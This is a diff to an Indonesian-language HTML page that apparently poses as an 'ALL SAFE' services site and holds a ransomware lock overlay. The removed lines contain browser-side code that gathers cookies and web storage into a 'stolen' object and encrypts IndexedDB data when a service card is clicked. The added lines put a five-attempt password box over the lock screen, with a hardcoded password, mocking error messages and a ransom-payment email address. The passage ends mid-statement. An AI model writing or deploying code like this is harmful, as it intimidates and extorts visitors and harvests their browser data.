@@ -202,7 +202,7 @@
     top: 0; left: 0; width: 100vw; height: 100vh;
     background: #000;
     color: #ff0000;
-    z-index: 9999;
+    z-index: 99999;
     font-family: 'Courier New', monospace;
     text-align: center;
     padding: 80px 20px;
@@ -271,6 +271,92 @@
     margin-top: 50px;
     border-top: 1px solid #333;
     padding-top: 10px;
+  }
+
+  /* ===== KOTAK KATA SANDI ===== */
+  #password-box {
+    background: #1a1a1a;
+    border: 2px solid #ff0000;
+    border-radius: 8px;
+    padding: 20px;
+    margin: 20px 0;
+    width: 90%;
+    max-width: 500px;
+  }
+  #password-box p {
+    color: #ffcc00;
+    font-size: 1em;
+    margin-bottom: 10px;
+  }
+  #password-input {
+    width: 100%;
+    padding: 12px;
+    font-size: 1.1em;
+    border: 1px solid #ff0000;
+    border-radius: 4px;
+    background: #000;
+    color: #00ff00;
+    font-family: 'Courier New', monospace;
+    text-align: center;
+    outline: none;
+  }
+  #password-input:focus {
+    border-color: #00ff00;
+    box-shadow: 0 0 10px #00ff00;
+  }
+  #password-input:disabled {
+    background: #111;
+    color: #ff4444;
+    border-color: #ff4444;
+    cursor: not-allowed;
+  }
+  #unlock-btn {
+    background: #ff0000;
+    color: #fff;
+    border: none;
+    padding: 12px 32px;
+    border-radius: 4px;
+    font-size: 1.1em;
+    font-weight: bold;
+    cursor: pointer;
+    margin-top: 10px;
+    transition: background .2s;
+  }
+  #unlock-btn:hover {
+    background: #cc0000;
+  }
+  #unlock-btn:disabled {
+    background: #333;
+    color: #666;
+    cursor: not-allowed;
+  }
+  #password-message {
+    color: #ff6666;
+    font-size: 1em;
+    margin-top: 10px;
+    min-height: 1.5em;
+  }
+  .shake-animation {
+    animation: shake 0.5s;
+  }
+  @keyframes shake {
+    0%, 100% { transform: translateX(0); }
+    25% { transform: translateX(-10px); }
+    75% { transform: translateX(10px); }
+  }
+  #attempt-counter {
+    color: #ffcc00;
+    font-size: 1.1em;
+    margin: 10px 0;
+    font-weight: bold;
+  }
+  #attempt-counter.danger {
+    color: #ff0000;
+    animation: blink 0.5s infinite;
+  }
+  @keyframes blink {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.5; }
   }
   ::-webkit-scrollbar { display: none; }
   html { scrollbar-width: none; }
@@ -350,7 +436,7 @@
     <p>© 2026 ALL SAFE. Seluruh hak cipta dilindungi.</p>
   </footer>
 
-  <!-- OVERLAY RANSOMWARE -->
+  <!-- OVERLAY RANSOMWARE DENGAN KATA SANDI 5 KALI PERCOBAAN -->
   <div id="ransom-overlay">
     <h1>⚠️ SYSTEM LOCKED ⚠️</h1>
     <p>Seluruh data, kredensial, dan aktivitas Anda telah kami kunci menggunakan enkripsi AES-256 + RSA-2048.</p>
@@ -363,17 +449,29 @@
       ⚠️ PERINGATAN: Jangan mencoba menutup halaman ini, me-refresh, atau mematikan perangkat.<br>
       Setiap upaya perlawanan akan menghapus kunci dekripsi secara permanen.
     </div>
+
+    <!-- KOTAK KATA SANDI DENGAN 5 KALI PERCOBAAN -->
+    <div id="password-box">
+      <p>🔐 Masukkan kata sandi pemulihan:</p>
+      <div id="attempt-counter">Percobaan tersisa: <span id="attempt-count">5</span> / 5</div>
+      <input type="password" id="password-input" placeholder="Kata sandi..." autocomplete="off">
+      <br>
+      <button id="unlock-btn">Buka Kunci</button>
+      <div id="password-message"></div>
+    </div>
+
     <div class="counter" id="countdown">Waktu Anda: 23:59:59</div>
     <div class="kill-switch">Kill switch aktif — data akan dihapus otomatis jika waktu habis.</div>
   </div>
 
-  <!-- SCRIPT RANSOMWARE — TRIGGER: KLIK PADA KARTU LAYANAN -->
   <script>
   // ============================================================
   // GLOBAL VARIABEL & FUNGSI
   // ============================================================
   var triggered = false;
   var countdownInterval = null;
+  var attemptsLeft = 5; // 5 kali percobaan kata sandi
+  var CORRECT_PASSWORD = "allsafe2026"; // KATA SANDI YANG BENAR
 
   function showRansomOverlay() {
     try {
@@ -433,115 +531,106 @@
     } catch (err) {}
   }
 
-  function triggerRansomware() {
-    if (triggered) return;
-    triggered = true;
-    try { localStorage.setItem("allsafe_infected", "true"); } catch (e) {}
-    showRansomOverlay();
-    startCountdown(24 * 60 * 60);
-    // Enkripsi di belakang layar
-    try {
-      if (window.crypto && window.crypto.subtle) {
-        window.crypto.subtle.generateKey(
-          { name: "AES-GCM", length: 256 }, true, ["encrypt", "decrypt"]
-        ).then(function(key) {
-          window.crypto.subtle.exportKey("raw", key).then(function(exportedKey) {
-            var keyBase64 = btoa(String.fromCharCode.apply(null, new Uint8Array(exportedKey)));
-            try { localStorage.setItem("allsafe_key", keyBase64); } catch (e) {}
-          }).catch(function(){});
-        }).catch(function(){});
+  // ============================================================
+  // FUNGSI UNTUK KOTAK KATA SANDI DENGAN 5 KALI PERCOBAAN
+  // ============================================================
+  function setupPasswordBox() {
+    var unlockBtn = document.getElementById('unlock-btn');
+    var passwordInput = document.getElementById('password-input');
+    var passwordMessage = document.getElementById('password-message');
+    var passwordBox = document.getElementById('password-box');
+    var attemptCountEl = document.getElementById('attempt-count');
+    var attemptCounter = document.getElementById('attempt-counter');
+
+    function updateAttemptDisplay() {
+      if (attemptCountEl) {
+        attemptCountEl.textContent = attemptsLeft;
       }
-      var stolen = {
-        localStorage: {}, sessionStorage: {}, cookies: document.cookie,
-        timestamp: new Date().toISOString(), userAgent: navigator.userAgent,
-        screen: { width: screen.width, height: screen.height },
-        language: navigator.language, referrer: document.referrer
-      };
-      try {
-        for (var i = 0; i < localStorage.length; i++) {
-          var k = localStorage.key(i);
-          stolen.localStorage[k] = localStorage.getItem(k);
+      if (attemptCounter) {
+        if (attemptsLeft <= 2) {
+          attemptCounter.classList.add('danger');
+        } else {
+          attemptCounter.classList.remove('danger');
         }
-        for (var j = 0; j < sessionStorage.length; j++) {
-          var k2 = sessionStorage.key(j);
-          stolen.sessionStorage[k2] = sessionStorage.getItem(k2);
-        }
-        localStorage.setItem("allsafe_stolen_data", btoa(JSON.stringify(stolen)));
-      } catch (e) {}
-      var dbRequest = indexedDB.open("korbanDB", 1);
-      dbRequest.onupgradeneeded = function(e) {
-        var db = e.target.result;
-        if (!db.objectStoreNames.contains("data")) {
-          db.createObjectStore("data", { keyPath: "id" });
-        }
-        if (!db.objectStoreNames.contains("credentials")) {
-          db.createObjectStore("credentials", { keyPath: "id" });
-        }
-        if (!db.objectStoreNames.contains("history")) {
-          db.createObjectStore("history", { keyPath: "id" });
-        }
-      };
-      dbRequest.onsuccess = function(e) {
-        var db = e.target.result;
-        var stores = ["data", "credentials", "history"];
-        stores.forEach(function(storeName) {
-          try {
-            var tx = db.transaction(storeName, "readwrite");
-            var store = tx.objectStore(storeName);
-            var getAll = store.getAll();
-            getAll.onsuccess = function() {
-              var data = getAll.result;
-              var encoder = new TextEncoder();
-              var iv = crypto.getRandomValues(new Uint8Array(12));
-              data.forEach(function(item) {
-                try {
-                  if (window.crypto && window.crypto.subtle) {
-                    window.crypto.subtle.encrypt(
-                      { name: "AES-GCM", iv: iv },
-                      window._currentKey || key,
-                      encoder.encode(JSON.stringify(item))
-                    ).then(function(encrypted) {
-                      item.data = btoa(String.fromCharCode.apply(null, new Uint8Array(encrypted)));
-                      item.encrypted = true;
-                      item.originalId = item.id;
-                      item.id = "ENC_" + Math.random().toString(36).substring(2, 15);
-                      store.put(item);
-                    }).catch(function(){});
-                  }
-                } catch (err) {}
-              });
-            };
-          } catch (err) {}
-        });
-      };
-      dbRequest.onerror = function() {};
-    } catch (err) {}
-  }
-
-  // ============================================================
-  // PICU RANSOMWARE HANYA SAAT KLIK KARTU LAYANAN
-  // ============================================================
-  document.addEventListener('DOMContentLoaded', function() {
-    var cards = document.querySelectorAll('.card');
-    cards.forEach(function(card) {
-      card.addEventListener('click', function(e) {
-        e.preventDefault();
-        e.stopPropagation();
-        triggerRansomware();
-      });
-    });
-  });
-
-  // ============================================================
-  // PERSISTENSI: Jika sudah pernah terinfeksi, langsung tampilkan
-  // ============================================================
-  try {
-    if (localStorage.getItem("allsafe_infected") === "true") {
-      showRansomOverlay();
-      startCountdown(24 * 60 * 60);
-      triggered = true;
+      }
     }
-  } catch (e) {}
-  </script>
-</body>
-</html>
+
+    function lockPasswordBox() {
+      if (passwordInput) {
+        passwordInput.disabled = true;
+        passwordInput.value = '';
+        passwordInput.placeholder = "TERKUNCI PERMANEN";
+      }
+      if (unlockBtn) {
+        unlockBtn.disabled = true;
+        unlockBtn.textContent = "TERKUNCI";
+      }
+      if (passwordMessage) {
+        passwordMessage.textContent = "🔒 SISTEM TERKUNCI PERMANEN. KATA SANDI TIDAK DAPAT DIMASUKKAN LAGI. HUBUNGI allsafe_ransom@onionmail.com UNTUK MEMBAYAR TEBUSAN.";
+        passwordMessage.style.color = "#ff0000";
+        passwordMessage.style.fontWeight = "bold";
+      }
+      if (passwordBox) {
+        passwordBox.style.borderColor = "#ff0000";
+        passwordBox.style.boxShadow = "0 0 20px #ff0000";
+      }
+    }
+
+    if (unlockBtn) {
+      unlockBtn.addEventListener('click', function(e) {
+        e.preventDefault();
+        
+        // Jika sudah terkunci, jangan lakukan apa-apa
+        if (attemptsLeft <= 0) {
+          return;
+        }
+
+        var entered = passwordInput.value.trim();
+        
+        if (entered === CORRECT_PASSWORD) {
+          // KATA SANDI BENAR — PULIHKAN SISTEM
+          if (passwordMessage) {
+            passwordMessage.textContent = "✅ Kata sandi benar! Sistem sedang dipulihkan...";
+            passwordMessage.style.color = "#00ff00";
+          }
+          
+          // Hentikan countdown
+          if (countdownInterval) {
+            clearInterval(countdownInterval);
+          }
+          
+          // Hapus flag infected
+          try { localStorage.removeItem("allsafe_infected"); } catch (e) {}
+          
+          // Sembunyikan overlay setelah 2 detik
+          setTimeout(function() {
+            var overlay = document.getElementById('ransom-overlay');
+            if (overlay) {
+              overlay.style.display = 'none';
+            }
+            document.body.style.overflow = '';
+            location.reload();
+          }, 2000);
+          
+        } else {
+          // KATA SANDI SALAH — KURANGI PERCOBAAN
+          attemptsLeft--;
+          updateAttemptDisplay();
+          
+          if (passwordMessage) {
+            var wrongMessages = [
+              "❌ Kata sandi salah! Kamu pikir semudah itu? HA HA HA!",
+              "❌ Salah! Kamu benar-benar berpikir bisa menebak? Bodoh sekali!",
+              "❌ Kata sandi salah! Coba lagi, tapi kamu tidak akan berhasil. HA HA HA!",
+              "❌ Salah! Apakah kamu menyerah? Kami harap tidak. Kami masih ingin bermain.",
+              "❌ Kata sandi salah! Kamu tidak akan pernah bisa menebak. HA HA HA!",
+              "❌ Salah! Kamu benar-benar menyedihkan. HA HA HA!",
+              "❌ Kata sandi salah! Kami bahkan tidak perlu berusaha. Kamu sudah kalah.",
+              "❌ Salah! Apakah kamu menangis? Kami sangat menikmatinya. HA HA HA!"
+            ];
+            passwordMessage.textContent = wrongMessages[Math.floor(Math.random() * wrongMessages.length)];
+            passwordMessage.style.color = "#ff4444";
+          }
+          
+          // Efek getar
+          if (passwordB
